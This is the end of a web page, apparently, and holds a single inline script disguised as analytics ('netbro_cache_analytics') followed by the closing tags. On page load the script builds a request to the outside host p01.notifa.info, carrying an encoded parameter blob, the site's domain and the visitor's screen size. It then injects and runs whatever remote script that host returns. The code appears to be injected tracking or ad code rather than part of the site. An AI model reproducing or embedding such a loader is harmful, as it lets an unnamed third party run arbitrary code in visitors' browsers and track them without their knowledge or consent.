<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mluL0c9GcofgjIoTqtPjmj6BOUU8NGoYWDC8pzd5srsgWjBWcgbvjsIRghjK5ToJ4ivfvMkpisLT%2fmCD%2bHnpZc3VPMDhKneX0EPUL3RtnIx6rY%2fKhYi5AEC10IV0kn26JmzwDcVc4GGEhA4l8isj%2bdFiMlV7huA05mD3Qp1htDef1Y%2f2oGvrvpeJGxPbhEKd94tYWLDRfS6pi3nmR9O2cSj%2bg7qEqOAgt%2f98f9QPmxt2i8uohPjvptFX1s%2bXg6AsUPcC5BYlHJZMKT9qm6%2by0lL%2b7mw1z1%2fBjhT8wDVTcAJRt82BpO7ijrRJTN7KJow1odZtBpuP57x2CGNu97VeGWQEkc2AC4Jr4sYe0gCyydGq2%2bVj1IeY8rQOtpTx3gK0DJ2rkIUzFIbIKVAg%2fPXBsdiWzUv59%2fIi9Vtm8VvACBQIBcEylDSk0M94xthrbru%2fLinnvowxa85l2B2oembAkKJOzQPX5oa8AxZX6HzFlfiqt4yAzOlCz6%2f%2fD%2btvv61UR" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>

</html>